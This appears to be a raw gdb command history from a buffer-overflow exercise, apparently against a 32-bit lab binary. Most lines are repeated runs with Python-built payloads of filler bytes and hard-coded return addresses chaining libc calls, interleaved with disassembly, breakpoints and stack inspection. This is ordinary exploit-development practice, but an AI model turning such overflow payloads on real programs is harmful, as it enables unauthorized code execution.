x/xw $esp-4
x/xw $esp-8
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
d
c
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"'`
q
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
disas main 
b *0x08048488
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
s
s
s
s
s
s
c
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
s
disas main 
disas ret
clear
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
b *0xb7e96270
c
s
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
delete breakpoints 
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
disas main 
p exit
b *0xb7e96270
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
q
b *0xb7e96270
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
q
disas main 
b *0x08048488
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
b *0xb7e96270
c
s
q
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x80\x0b\xeb\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
q
disas main 
b *0x08048488
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x80\x0b\xeb\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
b *0xb7eb0b80
c
b *0xb7eb0b80
c
x/xw $esp-4
q
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x80\x0b\xeb\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x80\x0b\xeb\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
p exit 
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
clear
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
disas main 
b *0x08048488
r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
s
c
disas main 
r `python -c 'print "A"*80+"FAKE"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
c
r `python -c 'print "A"*80+"FAKE"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
b *0xb7e96270
c
x/xw $esp-4
x/5xw $esp-20
b *0x08048488
delete breakpoints 
b *0x08048488
r `python -c 'print "A"*80+"FAKE"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
x/xw $esp-4
disas main
r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
c
c
q
r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
q
disas main 
b *0x08048488
r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
s
b *0xb7eb0bb5
c
s
x/xw $esp-4
x/3xw $esp-12
x/4xw $esp-12
#r `python -c 'print "A"*80+"FAKE"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
#r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
#r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
disas main 
b *0x08048488
q
b *0x08048488
#r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
s
b *0xb7eb0bb5
c
s
q
r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\xf7\x84\x04\x08"+"FAKESPOR"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x78\xf8\xff\xbf"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
r `python -c 'print "\x80\x0b\xeb\xb7\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
#r `python -c 'print "A"*80+"\x80\x0b\xeb\xb7"+"\x80\x0b\xeb\xb7"+"\x87\x84\x04\x08"+"\x21\x85\x04\x08"+"\x28\xf8\xff\xbf"'`
#r `python -c 'print "\x80\x0b\xeb\xb7\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
r `python -c 'print "\x80\x0b\xeb\xb7\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
q
clear
disas main 
b *0x08048488
r `python -c 'print "\x80\x0b\xeb\xb7\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
x/20xw 0xbffff76c
x/xw 0xbffff770
#r `python -c 'print "\x28\xf8\xff\xbf\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
r `python -c 'print "\x28\xf8\xff\xbf\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
c
c
c
r `python -c 'print "\x28\xf8\xff\xbf\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
q
r `python -c 'print "\x28\xf8\xff\xbf\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
q
              disas main 
b *0x08048488
r `python -c 'print "\x28\xf8\xff\xbf\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
s
b *0xb7eb0bb5
c
c
S
s
c
s
r `python -c 'print "\x28\xf8\xff\xbf\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
q
disas main 
b *0x08048488
r `python -c 'print "\x28\xf8\xff\xbf\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
x/20xw $esp-20
r `python -c 'print "\x88\xf7\xff\xbf\x80\x0b\xeb\xb7\x87\x84\x04\x08\x21\x85\x04\x08\x28\xf8\xff\xbf"*17'`
c
c
c
q
disassemble 
disassemble main 
list
r `python -c 'print "0"*80+"FAKE"+"AAAA"'`
p printf
disas main 
list
q
disas main
b main
r `python -c 'print "0"*90'`
x/100s $esp
x/200s $esp
disas main 
b *0x0804847d
r `python -c 'print "0"*90'`
c
dumpargs 0x0804847d
r `python -c 'print "0"*84+"\x7d\x84\x04\x08"+"FAKE"+"\x21\x85\x04\x08"+"\x38\xf9\xff\xbf"'`
c
c
r `python -c 'print "0"*84+"\x7d\x84\x04\x08"+"FAKE"+"\x21\x85\x04\x08"+"\x38\xf9\xff\xbf"'`
c
dumpargs 0x0804847d
r `python -c 'print "0"*84+"\x7d\x84\x04\x08"+"FAKE"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
c
c
c
r `python -c 'print "0"*84+"\x7d\x84\x04\x08"+"FAKE"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
q
b main
r
print printf
q
q
p exit
q
r `python -c 'print "A"*84+"\xb7x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
r `python -c 'print "A"*84+"\xb7\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
r `python -c 'print "A"*84+"\xb7\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
checksec 
cat /etc/rc.local
r `python -c 'print "A"*84+"\x70\x62\xe9\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
r `python -c 'print "A"*84+"\xb7\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"+"AAAA"'`
r `python -c 'print "A"*84+"\xb7\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"+"\x90"'`
p printf
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"+"AAAA"'`
disas main 
r `python -c 'print "A"*84+"\x7d\x84\x04\x08"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"+"AAAA"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"+"AAAA"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"+"AAAA"'`
q
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x
21\x85\x04\x08"+"\x28\xf9\xff\xbf"+"AAAA"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf""'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf""'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf""'`
disas main 
b *0x0804847d
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf""'`
clear
q
b *0x0804847d
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf""'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf""'`
p printf
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
dumpargs 0x0804847d
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
c
q
b *0x0804847d
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
dumpargs 0x0804847d
x/xb 0xbffff928
x/xb 0xbffff927
x/xb 0xbffff929
c
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\x07"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
c
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\x07"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
c
q
disas main 
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\x07"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\x07"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\x07"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xbf"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
disas main 
p exit
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
clear
ls
r `python -c 'print "A"*84+"\x80\x0b\xeb\xb7"+"\x70\x62\xe9\xb7"+"\x21\x85\x04\x08"+"\x28\xf9\xff\xbf"'`
disas main 
q
